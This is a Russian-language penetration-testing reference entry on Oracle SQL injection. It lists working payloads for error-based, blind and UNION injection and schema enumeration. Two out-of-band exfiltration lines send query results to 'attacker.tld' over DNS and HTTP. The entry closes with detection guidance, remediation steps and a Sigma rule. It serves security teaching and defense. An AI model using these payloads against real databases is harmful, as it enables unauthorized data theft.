---
id: sqli-oracle-error-based
title: "SQLi в Oracle: ошибки, DBMS_XMLGEN, UTL_HTTP и OOB-эксфильтрация"
type: sqli
target: oracle
category: web
difficulty: advanced
bypass: none
tags: [sqli, oracle, error-based, oob, utl_http, utl_inaddr]
tested_on: ["Oracle XE 21 (собственный контейнер)"]
success_rate: 0.55
risk: high
cwe: "CWE-89"
lab: null
last_verified: "2026-10-23"
references:
  - "https://portswigger.net/web-security/all-topics"
  - "https://owasp.org/www-community/attacks/SQL_Injection"
---

# SQLi в Oracle: ошибки, DBMS_XMLGEN, UTL_HTTP и OOB-эксфильтрация

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
# 1) определение СУБД и версии
' UNION SELECT NULL, banner FROM v$version--
' UNION SELECT NULL, version FROM product_component_version--

# 2) error-based через XML-функции (вывод ошибки содержит данные)
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--
' AND 1=DBMS_UTILITY.SQLID_TO_SQLHASH((SELECT user FROM dual))--
' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))--

# 3) DBMS_XMLGEN — ошибка с содержимым подзапроса
' AND 1=(SELECT DBMS_XMLGEN.GETXML('SELECT "'||(SELECT user FROM dual)||'" FROM dual') FROM dual)--

# 4) OOB-эксфильтрация (нужен исходящий доступ с СУБД)
#    DNS через UTL_INADDR:
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.attacker.tld')--
#    HTTP через UTL_HTTP:
' AND 1=UTL_HTTP.REQUEST('http://attacker.tld/'||(SELECT user FROM dual))--

# 5) слепая (boolean/time)
' AND 1=1--          /  ' AND 1=2--
' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)>0--        # задержка 5 секунд
' AND 1=(CASE WHEN (SELECT user FROM dual)='SYS' THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END)--

# 6) перечисление объектов (Oracle-специфика)
' UNION SELECT NULL, table_name FROM all_tables--
' UNION SELECT NULL, column_name FROM all_tab_columns WHERE table_name='USERS'--
' UNION SELECT NULL, username FROM all_users--

# 7) Oracle-синтаксические особенности (обход фильтров)
#    || вместо + для конкатенации; CHR() для символов; двойные кавычки для идентификаторов
' UNION SELECT NULL, 'A'||'B' FROM dual--
' UNION SELECT NULL, CHR(65)||CHR(66) FROM dual--
' UNION SELECT NULL, table_name FROM all_tables WHERE table_name NOT LIKE '%SYS%'--
```

## Explanation

Oracle-специфика, которую нужно знать:

* **Обязателен `FROM`**: `SELECT ... FROM dual` — синтаксис без источника
  невалиден, поэтому `UNION SELECT user` не сработает.
* **Конкатенация `||`**, а не `+`; `CONCAT()` принимает только два
  аргумента.
* **Системные представления**: `v$version`, `all_tables`,
  `all_tab_columns`, `all_users`, `dba_*` (нужны права),
  `product_component_version`.
* **Error-based через исключения**: `UTL_INADDR.GET_HOST_NAME`,
  `CTXSYS.DRITHSX.SN`, `DBMS_UTILITY.SQLID_TO_SQLHASH`,
  `DBMS_XMLGEN.GETXML` — текст ошибки содержит результат подзапроса,
  что даёт быстрый вывод данных без слепого перебора.
* **OOB-каналы**: `UTL_HTTP`, `UTL_INADDR`, `UTL_TCP`, `HTTPURIType`,
  `DBMS_LDAP` — если у СУБД есть исходящий доступ, данные уходят
  на ваш сервер. Это же главный признак для детектирования.
* **Задержки**: `DBMS_PIPE.RECEIVE_MESSAGE('a', N)`,
  `DBMS_LOCK.SLEEP(N)` (требует прав), `DBMS_XDB.GETXML` с тяжёлым запросом.
* **Комментарии**: `--` работает, `#` — нет; `/* */` работает.
* **Экранирование строк**: `q'[...]'` (альтернативная квотинг-синтаксис)
  помогает обходить фильтры кавычек.
* **ROLES/PRIVILEGES**: если инъекция выполняется от учётки с
  `DBA`-правами, возможна эскалация до выполнения кода через
  `DBMS_SCHEDULER`, Java-источники, `CREATE LIBRARY` (это уже
  пост-эксплуатация, требующая отдельного анализа и разрешений).

## Detection

* Алерт на Oracle-специфичные функции в тексте SQL из приложения:
  `UTL_HTTP`, `UTL_INADDR`, `UTL_TCP`, `DBMS_PIPE`, `DBMS_LOCK`,
  `DBMS_XMLGEN`, `CTXSYS.DRITHSX.SN`.
* Исходящие DNS/HTTP-запросы от хоста СУБД к внешним доменам —
  почти всегда аномалия (OOB-эксфильтрация).
* Единый аудит Oracle (Unified Auditing / `AUDIT SESSION`):
  анализ `DBID`, `SQL_TEXT`, `USERHOST`, числа ошибок `ORA-01722`,
  `ORA-00942`, `ORA-00933` (синтаксические ошибки — признак инъекций).
* Всплеск `ORA-00942` (table or view does not exist) от одного
  пользователя приложения — перечисление схемы.
* WAF-правила на `UNION SELECT ... FROM dual`, `v$version`,
  `all_tab_columns`.
* Мониторинг аномальных объёмов выборки (число строк на запрос,
  объём исходящего трафика из СУБД).

## Remediation

- Параметризованные запросы (bind variables) — в Oracle это ещё и
  вопрос производительности (shared pool).
- Минимальные права учётки приложения: только `SELECT/INSERT/UPDATE/DELETE`
  на нужные таблицы; никаких `DBA`, `EXECUTE ANY PROCEDURE`,
  `UTL_*`-пакетов.
- Отозвать права на `UTL_HTTP`, `UTL_INADDR`, `UTL_TCP`, `DBMS_SCHEDULER`,
  `DBMS_LOB`, `UTL_FILE` у прикладных учёток (ACL через
  `DBMS_NETWORK_ACL_ADMIN`).
- Egress-фильтрация с хоста СУБД: только необходимые направления;
  DNS — через контролируемый резолвер.
- Отключить вывод ошибок СУБД клиенту; единый формат ошибок приложения.
- Валидация и типизация входных данных (числа — как числа).
- Единый аудит с централизованным сбором и алертами на ORA-ошибки
  и вызовы сетевых пакетов.
- Регулярные обновления CPU (Critical Patch Update).

## Detection rules

```yaml
title: Oracle error-based — CTXSYS/DBMS_UTILITY/UTL_INADDR и v$version
id: e5f6a7b8-0034-4e5f-9a7b-000000000034
status: experimental
description: >-
  Специфичные для Oracle функции вывода данных через ошибку
  (CTXSYS.DRITHSX.SN, DBMS_UTILITY.SQLID_TO_SQLHASH, UTL_INADDR.GET_HOST_NAME)
  и запросы к v$version/product_component_version в параметрах или тексте
  ошибки ORA-*.
references:
  - https://attack.mitre.org/techniques/T1190/
logsource:
  category: application
  service: database
  definition: 'access-лог приложения и журнал ошибок Oracle (alert log / listener log)'
detection:
  query_probe:
    cs-uri-query|contains:
      - 'v$version'
      - 'CTXSYS.DRITHSX'
      - 'DBMS_UTILITY.SQLID_TO_SQLHASH'
      - 'UTL_INADDR.GET_HOST_NAME'
      - 'product_component_version'
      - 'FROM dual'
  db_error:
    error_message|contains:
      - 'ORA-06502'
      - 'ORA-01722'
      - 'CTXSYS'
      - 'DRITHSX'
      - 'UTL_INADDR'
  condition: query_probe or db_error
fields:
  - c-ip
  - cs-uri-query
  - error_message
  - statement
falsepositives:
  - приложения на Oracle EBS, легитимно вызывающие UTL_INADDR (белый список по db_user)
level: high
tags:
  - attack.initial_access
  - attack.t1190
  - cwe.89
```
